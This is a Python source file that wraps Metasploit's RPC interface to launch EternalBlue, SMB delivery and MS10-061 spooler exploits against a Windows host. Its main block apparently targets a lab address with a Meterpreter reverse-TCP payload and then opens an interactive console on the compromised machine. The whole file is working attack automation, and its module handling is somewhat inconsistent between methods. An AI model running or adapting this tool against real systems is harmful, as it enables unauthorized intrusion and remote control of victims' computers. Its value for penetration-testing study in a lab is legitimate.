from libs.modules.Module_List import Modules
# import Modules
from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PostModule, EncoderModule, AuxiliaryModule, NopModule, \
    PayloadModule, MsfConsole
# 
from libs.Payloads import Payloads
from libs.Tools import get_ipv4
from libs.Tools import Get_Printer
# 
class Attack:
    __rpc: MsfRpcClient
    __rhost: str
    __module_path: Modules
    __payload: Payloads
    __module: ExploitModule | PostModule | EncoderModule | AuxiliaryModule | NopModule | PayloadModule
    __console: MsfConsole
# 
    def __init__(self,
                 rpc: MsfRpcClient,
                 rhost: str = None,
                 module: Modules = None,
                 payload: Payloads = None):
        self.__rpc = rpc
        self.__rhost = rhost
        self.__module_path = module
        self.__payload = payload
        self.__ipv4 = get_ipv4()
        self.__console = None
        print('initialize successful')
# 
    def setModule(self, module: Modules):
        self.__module_path = module
# 
    def setPayload(self, payload: Payloads):
        self.__payload = payload
# 
    def run_eternal_blue(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module['RHOSTS'] = self.__rhost
        cid = self.__rpc.consoles.console().cid
        __console = self.__rpc.consoles.console(cid)
        print(
            __console.run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
        )
        print(__console.read())
# 
    def run_smb_delivery(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module.target = 0  # {0: 'DLL', 1: 'PSH'}
        self.__module["SRVHOST"] = self.__ipv4
        self.__module['SRVPORT'] = 4445
        cid = self.__rpc.consoles.console().cid
        __console = self.__rpc.consoles.console(cid)
        print(
            __console.run_module_with_output(self.__module)
        )
        print(__console.read())
        # Maybe show in GUI
    def run_smb_spoolss(self):
        first_slash_index = self.__module_path.find('/')
        mtype = self.__module_path[:first_slash_index]
        mname = self.__module_path[first_slash_index + 1:]
        print(mtype, mname)
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module["RHOSTS"] = self.__rhost
        self.__module["PNAME"] = Get_Printer(self.__rhost)[0]
        cid = self.__rpc.consoles.console().cid
        self.__console = self.__rpc.consoles.console(cid)
        print(self.__payload)
        print(
            self.__console.run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload))
        )
# 
    def Get_console(self):
        while True:
            print(self.__console.read())
            cmd = input("CMD: ")
            self.__console.write(cmd)
            if cmd == "break":
                break
# 
if __name__ == '__main__':
    client = MsfRpcClient("salt", port=55553, ssl=True)
# 
    atk = Attack(client, rhost="10.0.2.10")
    atk.setModule("exploit/" + Modules.MS10_061_SPOOLSS)
    atk.setPayload("windows/meterpreter/reverse_tcp")

    atk.run_smb_spoolss()
    
    atk.Get_console()
# 
# print(Get_Printer("10.0.2.10"))